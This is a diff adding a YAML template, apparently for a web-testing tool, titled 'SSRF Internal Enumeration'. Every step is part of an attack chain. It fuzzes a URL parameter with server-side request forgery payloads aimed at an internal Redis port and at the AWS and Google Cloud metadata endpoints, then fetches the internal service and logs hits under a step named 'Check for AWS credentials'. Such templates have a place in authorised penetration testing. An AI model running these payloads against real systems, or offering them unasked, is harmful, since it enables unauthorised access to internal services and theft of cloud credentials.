@@ -1,0 +1,27 @@
+name: "SSRF Internal Enumeration"
+description: "Chain SSRF discovery with internal service enumeration"
+
+variables:
+  internal_ip: "10.0.0.1"
+  internal_port: "6379"
+
+steps:
+  - name: "Discover SSRF"
+    action: fuzz
+    payload_type: ssrf
+    param: url
+    payloads:
+      - "http://{{internal_ip}}:{{internal_port}}"
+      - "http://169.254.169.254/latest/meta-data/"
+      - "http://metadata.google.internal/computeMetadata/v1/"
+    
+  - name: "Extract internal data"
+    condition: "last_response.contains('internal')"
+    action: request
+    method: GET
+    url: "http://{{internal_ip}}:{{internal_port}}"
+
+  - name: "Check for AWS credentials"
+    condition: "last_response.status == 200"
+    action: log
+    message: "Found data at {{last_response.url}}"
